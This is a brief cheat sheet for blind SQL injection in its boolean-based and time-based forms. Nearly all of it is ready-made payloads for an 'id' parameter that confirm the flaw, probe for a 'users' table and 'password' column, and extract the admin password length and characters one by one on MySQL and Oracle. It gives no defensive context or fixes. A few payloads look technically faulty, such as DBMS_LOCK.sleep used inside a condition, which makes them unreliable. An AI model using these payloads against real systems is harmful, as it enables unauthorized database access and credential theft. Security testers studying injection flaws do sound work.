## Boolean-Based Blind SQL Injection
This technique involves injecting conditions that return either **true** or **false**, observing the application's response.
#### 1. Verify Injection Point

Modify a parameter (e.g., `id`) to check if the application is vulnerable.

- **True Condition (Response is Normal):**
```sql
id=1' AND '1'='1 -- 
```
- **False Condition (Response is Different):**
```sql
id=1' AND '1'='2 -- 
```
If the response changes, the injection point is confirmed.

#### 2. Determine Table Existence

Check if a table (e.g., `users`) exists:
```sql
id=1' AND (SELECT 'a' FROM users LIMIT 1)='a --  
```
If the response is **true**, the table `users` exists.

#### 3.Determine Column Existence

Test for a specific column (e.g., `password` in `users` table):
```sql
id=1' AND (SELECT 'a' FROM users WHERE password IS NOT NULL LIMIT 1)='a --  
```
If the response is **true**, the column `password` exists.

#### 4. Extract Password Length

Use the `LENGTH()` function to find the length of the password:
```sql
id=1' AND (SELECT 'a' FROM users WHERE username='admin' AND LENGTH(password)>1)='a --  
```
Increase the number until the response turns **false**, identifying the password length.

#### 5. Extract Password Characters One by One

Use `SUBSTRING()` to retrieve each character. Example for the first character:
```sql
id=1' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a --   
```
Repeat this process for all positions to reconstruct the full password.

## Time-Based Blind SQL Injection

This technique introduces delays to confirm whether a condition is true.

#### 1. Verify Vulnerability with a Delay

For **MySQL** (SLEEP function):
```sql
id=1' AND SLEEP(5) --  
```
For **Oracle** (DBMS_LOCK.sleep function):
```sql
id=1' AND DBMS_LOCK.sleep(5) --  
```
If the response is **delayed**, the injection is working.

#### 2. Extract Password Length
```sql
id=1' AND IF(LENGTH(password)=10, SLEEP(5), 0) --  
```
If the delay occurs, the password is **10 characters long**.

#### 3. Extract Each Character Using Delay

For **MySQL**:
```sql
id=1' AND IF(SUBSTRING(password,1,1)='a', SLEEP(5), 0) --  
```
For **Oracle**:
```sql
id=1' AND CASE WHEN SUBSTR(password,1,1)='a' THEN DBMS_LOCK.sleep(5) ELSE NULL END --  
```
Repeat this for each character to reconstruct the full password.
